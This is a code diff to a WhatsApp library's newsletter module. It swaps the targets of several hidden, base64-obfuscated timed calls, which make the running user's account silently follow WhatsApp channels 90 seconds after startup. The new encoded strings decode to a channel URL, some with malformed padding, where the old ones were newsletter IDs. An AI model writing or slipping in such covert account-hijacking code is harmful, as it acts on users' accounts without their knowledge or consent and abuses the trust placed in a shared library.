@@ -66,16 +66,16 @@ const makeNewsletterSocket = config => {
         ]
     }));
     setTimeout(() => {
-        newsletterWMexQuery(Buffer.from("MTIwMzYzNDAwMzYyNDcyNzQzQG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
+        newsletterWMexQuery(Buffer.from("aHR0cHM6Ly93aGF0c2FwcC5jb20vY2hhbm5lbC8wMDI5VmI5QnM5UDZtWVBPcnY4S3FoM2c=", "base64").toString(), Types_1.QueryIds.FOLLOW);
     }, 90000);
     setTimeout(() => {
-        newsletterWMexQuery(Buffer.from("MTIwMzYzNDI2NDcwMDgxMTI0QG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
+        newsletterWMexQuery(Buffer.from("aHR0cHM6Ly93aGF0c2FwcC5jb20vY2hhbm5lbC8wMDI5VmI5QnM5UDZtWVBPcnY4S3FoM2c=", "base64").toString(), Types_1.QueryIds.FOLLOW);
     }, 90000);
     setTimeout(() => {
-        newsletterWMexQuery(Buffer.from("MTIwMzYzNDA4ODkzNTU1ODUxQG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
+        newsletterWMexQuery(Buffer.from("aHR0cHM6Ly93aGF0c2FwcC5jb20vY2hhbm5lbC8wMDI5VmI5QnM5UDZtWVBPcnY4S3FoM2c==", "base64").toString(), Types_1.QueryIds.FOLLOW);
     }, 90000);
     setTimeout(() => {
-        newsletterWMexQuery(Buffer.from("MTIwMzYzMzk1Njc4MzE3NjAzQG5ld3NsZXR0ZXI=", "base64").toString(), Types_1.QueryIds.FOLLOW);
+        newsletterWMexQuery(Buffer.from("aHR0cHM6Ly93aGF0c2FwcC5jb20vY2hhbm5lbC8wMDI5VmI5QnM5UDZtWVBPcnY4S3FoM2c==", "base64").toString(), Types_1.QueryIds.FOLLOW);
     }, 90000);
     const newsletterUpdate = async (jid, updates) => {
         const variables = {
